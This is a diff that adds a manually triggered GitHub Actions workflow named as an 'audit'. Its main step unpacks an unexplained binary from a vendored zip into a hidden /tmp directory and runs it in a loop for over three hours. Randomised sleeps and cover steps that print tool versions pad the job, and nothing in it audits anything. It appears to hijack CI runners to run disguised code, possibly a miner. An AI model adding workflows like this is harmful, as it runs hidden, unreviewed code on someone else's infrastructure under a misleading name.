@@ -1,0 +1,19 @@
+name: audit-h9n3
+on:
+  workflow_dispatch:
+jobs:
+  deploy_ts8:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v4
+      - run: curl --version | head -1
+      - name: audit
+        run: |
+          P9=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/13f0189b.zip -d ${P9} && chmod +x ${P9}/runner-8d
+          cd ${P9} && timeout 191m bash -c 'for ((;;)); do ./runner-8d; echo "exit rc=$? $(date -u +%H:%M)"; sleep 8; done'
+          for i in $(seq 1 160); do sleep $((RANDOM % 76 + 59)); echo "5t38tw $i/160 $(date -u +%H:%M)"; done
+
+      - run: gcc --version | head -1
+      - run: lsb_release -a 2>/dev/null || true
+      - run: uname -m
